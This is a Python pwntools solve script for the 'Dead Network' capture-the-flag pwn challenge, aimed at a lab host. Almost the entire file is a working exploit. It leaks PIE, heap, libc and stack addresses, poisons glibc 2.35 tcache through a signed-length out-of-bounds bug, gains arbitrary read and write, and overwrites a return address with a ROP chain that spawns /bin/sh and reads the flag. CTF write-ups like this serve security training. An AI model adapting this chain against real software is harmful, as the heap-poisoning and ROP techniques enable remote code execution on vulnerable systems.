#!/usr/bin/env python3
# Dead Network (BCS CTF 26, Pwn) - glibc 2.35 heap OOB -> tcache poison -> system("/bin/sh").
#
# Gate:    the banner's "system() @ %p" is slop_filter_ai's address -> PIE leak.
#          16-byte token answered with resp[i] = token[i] ^ i ^ 0x13, on a 10s alarm(10).
#          build_menu() shuffles the option numbers per connection, so they are parsed.
# Bug:     add() does malloc(len + 0x40) with a SIGNED len, but print() always reads the
#          body at notes[i] + 0x40. A negative len gives a 0x20 chunk whose "Content" is
#          two chunks further on - an out-of-bounds read/write relative to the allocation.
#          edit()'s title write is a fixed fgets(...,0x3f,...) unrelated to the real size.
# Chain:   free a 0x20 chunk -> its safe-linked fd is just (addr >> 12), read through a
#          neighbour's "Content" -> heap page. Overflow a title to rewrite that fd as a
#          safe-linked pointer to the global notes[] array, then malloc twice: the second
#          allocation IS notes[], which is therefore fully attacker-controlled -> arbitrary
#          read (print) and arbitrary write (edit). puts@GOT -> libc, environ -> stack,
#          scan for main's fixed dispatch return slot, overflow it with a ROP chain.
#
# Usage:
#   python3 solve.py remote            # 172.16.38.22:6655 (default)
#   python3 solve.py local             # needs a glibc 2.35 libc; see LIBC below
from pwn import *
import os, re, sys, time

context.arch = "amd64"
context.log_level = "info"

HERE = os.path.dirname(os.path.abspath(__file__))
CHAL = os.path.normpath(os.path.join(HERE, "..", "..", "..", "pwn", "pwn-deadnet"))
EXE = os.path.join(CHAL, "deadnet")

# Target is Ubuntu 22.04 -> glibc 2.35-0ubuntu3.15. Offsets below are from that libc and
# are what the remote is actually running; the host's own libc will NOT match.
# Set LIBC=/path/to/libc.so.6 to resolve them from a file instead of using the constants.
OFFSETS = {
    "puts": 0x80E10,
    "system": 0x50D70,
    "environ": 0x222200,
    "binsh": 0x1D8678,
    "pop_rdi": 0x2A3E5,
    "ret": 0x29CD6,
}
PIE_SLOPS = 0x13C9     # slop_filter_ai
NOTES_OFF = 0x2A0      # &notes[] within the leaked heap page
PUTS_GOT = 0x4F48

MODE = sys.argv[1] if len(sys.argv) > 1 else "remote"
io = remote("172.16.38.22", 6655) if MODE == "remote" else process(EXE)

libc_path = os.environ.get("LIBC")
if libc_path:
    _l = ELF(libc_path, checksec=False)
    A = {k: _l.sym.get(k) or next(_l.search(b"/bin/sh")) for k in ("puts", "system", "environ")}
    A["binsh"] = next(_l.search(b"/bin/sh"))
    _r = ROP(_l)
    A["pop_rdi"] = _r.find_gadget(["pop rdi", "ret"]).address
    A["ret"] = _r.find_gadget(["ret"]).address
else:
    A = OFFSETS


# ---------------- gate: 16-byte XOR handshake + PIE leak ----------------
def handshake():
    io.recvuntil(b"system() @ ")
    pie = int(io.recvline().strip(), 16) - PIE_SLOPS
    io.recvuntil(b"Token: ")
    tok = bytes.fromhex(io.recvline().strip().decode())
    io.send(bytes(tok[i] ^ i ^ 0x13 for i in range(16)))   # must beat alarm(10)
    return pie


PIE = handshake()
log.success("PIE base = %#x" % PIE)


# ---------------- menu (numbering is shuffled every connection) ----------------
menu = {}


def parse_menu():
    block = io.recvuntil(b"$ ")
    menu.clear()
    for line in block.split(b"\n"):
        line = line.strip()
        if b") " in line and line[:1].isdigit():
            menu[line.split(b") ", 1)[1].decode()] = int(line.split(b")")[0])


parse_menu()


def choose(action):
    io.sendline(str(menu[action]).encode())


def add(length, title, tag=0):
    choose("Add a note")
    io.recvuntil(b"length"); io.sendline(str(length).encode())
    io.recvuntil(b"title"); io.send(title + b"\n")
    io.recvuntil(b"tag"); io.sendline(str(tag).encode())
    parse_menu()


def delete(i):
    choose("Delete a note")
    io.recvuntil(b"delete"); io.sendline(str(i).encode())
    parse_menu()


def edit_title(i, data):
    choose("Edit a note")
    io.recvuntil(b"edit"); io.sendline(str(i).encode())
    io.recvuntil(b"Edit title"); io.sendline(b"1")
    io.recvuntil(b"title"); io.send(data + b"\n")
    parse_menu()


def show(i):
    choose("Print a note")
    io.recvuntil(b"view"); io.sendline(str(i).encode())
    out = io.recvuntil(b"$ ")
    menu.clear()
    for line in out.split(b"\n"):
        line = line.strip()
        if b") " in line and line[:1].isdigit():
            menu[line.split(b") ", 1)[1].decode()] = int(line.split(b")")[0])
    return out


# ---------------- Phase A: heap leak ----------------
# add(-0x30) -> malloc(0x10) = 0x20 chunk, but "Content" is read at p+0x40, so with three
# consecutive 0x20 chunks M,V,F we get M+0x40 == F. Freeing F exposes its tcache fd there.
add(-0x30, b"M")
add(-0x30, b"V")
add(-0x30, b"F")
delete(2)
raw = re.search(rb"Content: ([^\n]*)", show(0)).group(1)
heap = u64(raw.ljust(8, b"\x00")[:8]) << 12
notes_arr = heap + NOTES_OFF
log.success("heap base = %#x" % heap)

# ---------------- Phase B: tcache poison onto notes[] ----------------
protect = lambda pos, ptr: (pos >> 12) ^ ptr
delete(1)                                                    # tcache[0x20]: V -> F
edit_title(0, b"A" * 0x20 + p64(protect(heap + 0x30, notes_arr)))
add(-0x30, b"x")                                            # malloc #1 -> V
add(-0x30, p64(PIE + PUTS_GOT) + p64(0) + p64(notes_arr))   # malloc #2 -> notes[]
CTRL = 1                                                     # note 1 *is* notes[]


def set_n0(addr):
    edit_title(CTRL, p64(addr) + p64(notes_arr) + p64(notes_arr))


def read64(addr):
    set_n0(addr)
    t = re.search(rb"Title: ([^\n]*)", show(0)).group(1)
    return u64(t.ljust(8, b"\x00")[:8])


# ---------------- Phase C: libc + stack ----------------
libc_base = read64(PIE + PUTS_GOT) - A["puts"]
log.success("libc base = %#x" % libc_base)
assert read64(libc_base).to_bytes(8, "little")[:4] == b"\x7fELF", "libc base looks wrong"

environ = read64(libc_base + A["environ"])
log.success("environ (stack) = %#x" % environ)

# ---------------- Phase D: find main's fixed dispatch return slot ----------------
# While print() runs, the slot holds PIE+0x2207; main's frame never moves, so the same
# slot holds PIE+0x21f9 while edit() runs -- which is when we overwrite it.
target_ret = PIE + 0x2207
S = None
for off in range(0x8, 0x600, 8):
    if read64(environ - off) == target_ret:
        S = environ - off
        break
assert S, "return slot not found"
log.success("saved-return slot S = %#x" % S)

# ---------------- Phase E: ROP over the return address ----------------
chain = (p64(libc_base + A["pop_rdi"]) + p64(libc_base + A["binsh"])
         + p64(libc_base + A["ret"]) + p64(libc_base + A["system"]))
assert b"\n" not in chain, "newline byte inside ROP chain (fgets would truncate it)"
assert b"\n" not in p64(S), "newline byte in target address"

set_n0(S)
choose("Edit a note")
io.recvuntil(b"edit"); io.sendline(b"0")
io.recvuntil(b"Edit title"); io.sendline(b"1")
io.recvuntil(b"title"); io.send(chain + b"\n")   # writes over edit()'s return address

# edit() returns into the chain -> system("/bin/sh")
time.sleep(0.4)
io.sendline(b"id; cat /script/flag.txt flag.txt 2>/dev/null; echo __END__")
try:
    out = io.recvall(timeout=12)
except Exception:
    out = b""

m = re.search(rb"bcsctf\{[^}]*\}", out)
if m:
    log.success("FLAG: %s" % m.group(0).decode())
else:
    log.failure("no flag; tail=%r" % out[-300:])
io.close()
